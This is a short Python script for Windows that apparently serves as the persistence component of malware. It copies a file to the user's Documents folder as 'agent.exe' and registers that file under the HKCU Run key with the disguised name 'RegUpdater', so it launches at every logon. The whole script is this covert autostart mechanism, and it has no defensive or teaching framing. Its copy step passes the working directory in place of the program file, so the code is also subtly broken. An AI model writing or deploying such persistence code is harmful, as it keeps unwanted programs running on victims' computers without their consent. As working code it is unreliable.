import os
import subprocess
import winreg
import shutil
path = os.getcwd()
null, userProf = subprocess.getoutput("set USERPROFILE").split('=')
destination = userProf + '\\Documents\\' + 'agent.exe'
if not os.path.exists(destination):
    shutil.copyfile(path, destination)
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",
                         0, winreg.KEY_ALL_ACCESS)
    winreg.SetValueEx(key, 'RegUpdater', 0, winreg.REG_SZ, destination)
    winreg.CloseKey(key)

